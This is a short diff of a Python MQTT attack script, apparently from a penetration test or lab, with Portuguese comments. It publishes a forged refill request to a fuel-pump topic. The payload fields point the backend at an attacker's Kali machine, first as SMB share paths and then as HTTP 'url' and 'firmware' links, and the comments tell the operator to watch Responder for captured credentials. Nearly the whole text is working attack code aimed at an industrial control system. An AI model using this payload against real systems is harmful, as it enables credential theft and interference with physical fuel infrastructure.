@@ -7,14 +7,14 @@ KALI_IP = "10.10.100.8"
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
-# Mantém as variáveis originais intactas e adiciona gatilhos extras no JSON
+# Tentando forçar o backend a fazer um "fetch" ou requisição HTTP para o seu Kali
 payload = {
     "pumpId": "PUMP003",
     "currentLevel": 5,
-    "log_path": rf"\\{KALI_IP}\share",
-    "path": rf"\\{KALI_IP}\share"
+    "url": f"http://{KALI_IP}/trigger",
+    "firmware": f"http://{KALI_IP}/firmware.bin"
 }
 
 client.publish("fuel-pumps/refill-request", json.dumps(payload))
-print("[+] Teste 2 enviado. Monitore o Responder!")
+print("[+] Gatilho HTTP enviado. Verifique o terminal do Responder!")
 client.disconnect()
